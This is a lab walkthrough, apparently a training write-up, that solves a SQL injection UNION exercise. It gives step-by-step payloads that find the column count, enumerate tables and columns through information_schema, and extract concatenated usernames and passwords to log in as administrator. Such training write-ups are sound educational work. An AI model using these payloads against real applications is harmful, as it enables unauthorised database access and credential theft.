# Lab: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

***

Let's Start !!

First We Visit The Website !!

<figure><img src="../../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

We Try To Inject Single Quote `'` To Break The Backend Query !!

<figure><img src="../../../.gitbook/assets/image (712).png" alt=""><figcaption></figcaption></figure>

When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!

<figure><img src="../../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>

**Finding Number of Columns**

**Method – ORDER BY**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

If `ORDER BY 3` fails, query has 2 columns.

<figure><img src="../../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

That `ORDER BY 3` fails, query has 2 columns.

<figure><img src="../../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>

Let's We Use In Our Two Column Table !!

Then See If Our First and Second Both Column is String They Return No Error If They Return Error It's Mean One Column is Integer and One is String!!

```
'UNION SELECT 'a','b'--
```

<figure><img src="../../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>

Then We Use This Query If It's Work It's Mean Second column is String !!

```
'UNION SELECT 'a','b'--
```

<figure><img src="../../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>

Use the following payload to retrieve the list of tables in the database:

```
' UNION SELECT NULL,table_name FROM information_schema.tables--
```

<figure><img src="../../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

```
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```

<figure><img src="../../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>

Use the following payload to retrieve the contents of the `users` table:

```
' UNION SELECT NULL,username||'~'||password FROM users--
```

<figure><img src="../../../.gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

Find the password for the `administrator` user, and use it to log in.

<figure><img src="../../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>
